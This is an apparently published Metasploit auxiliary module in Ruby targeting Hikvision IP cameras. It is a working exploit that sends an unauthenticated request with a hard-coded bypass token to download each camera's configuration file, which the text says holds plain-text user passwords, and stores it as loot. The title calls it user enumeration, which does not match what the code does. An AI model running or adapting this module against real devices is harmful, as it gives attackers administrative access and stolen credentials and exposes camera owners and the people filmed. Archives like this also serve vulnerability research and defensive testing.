# Exploit title: Hikvision IP Camera 5.4.0 - User Enumeration (Metasploit)
# Author: Alfie
# Date: 2018-08-21
# Website: https://www.hikvision.com/en/
# Software: Hikvision Camera
# Versions:
# DS-2CD2xx2F-I Series: V5.2.0 build 140721 to V5.4.0 build 160530
# DS-2CD2xx0F-I Series: V5.2.0 build 140721 to V5.4.0 Build 160401
# DS-2CD2xx2FWD Series: V5.3.1 build 150410 to V5.4.4 Build 161125
# DS-2CD4x2xFWD Series: V5.2.0 build 140721 to V5.4.0 Build 160414
# DS-2CD4xx5 Series: V5.2.0 build 140721 to V5.4.0 Build 160421
# DS-2DFx Series: V5.2.0 build 140805 to V5.4.5 Build 160928
# DS-2CD63xx Series: V5.0.9 build 140305 to V5.3.5 Build 160106

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Configuration download in Hikvision IP Cameras',
      'Description'    => %q{
          Many Hikvision IP cameras contain a backdoor that allows unauthenticated impersonation of any configured user account. The vulnerability has been present in Hikvision products since at least 2014. In addition to Hikvision-branded devices, it affects many white-labeled camera products sold under a variety of brand names. Hundreds of thousands of vulnerable devices are still exposed to the Internet at the time of publishing. In addition to gaining full administrative access, the vulnerability can be used to retrieve plain-text passwords for all configured users.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Monte Crypto', # Vulnerability discovery
          'Alfie Njeru' # Metasploit module
        ],
      'References'     =>
        [
          [ 'URL', 'https://packetstormsecurity.com/files/144097/Hikvision-IP-Camera-Access-Bypass.html' ],

          [ 'URL', 'http://seclists.org/fulldisclosure/2017/Sep/23' ]
        ]
    ))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [true, 'Path to the path that config is stored ', '/System/configurationFile?auth=YWRtaW46MTEK'])
      ])
  end

  def run_host(ip)

    print_status("#{rhost}:#{rport} - Sending request...")
    uri = normalize_uri(target_uri.path)
    res = send_request_cgi({
      'uri'          => uri,
      'method'       => 'GET',
    })

    if res and res.code == 200
      contents = res.body
      fname = File.basename(datastore['TARGETURI'])
      path = store_loot(
        'usersvision ',
        'text/plain',
        ip,
        contents,
        fname
      )
      print_status("#{rhost}:#{rport} - File saved in: #{path}")
    else
      print_error("#{rhost}:#{rport} - Failed to retrieve file")
      return
    end
  end
end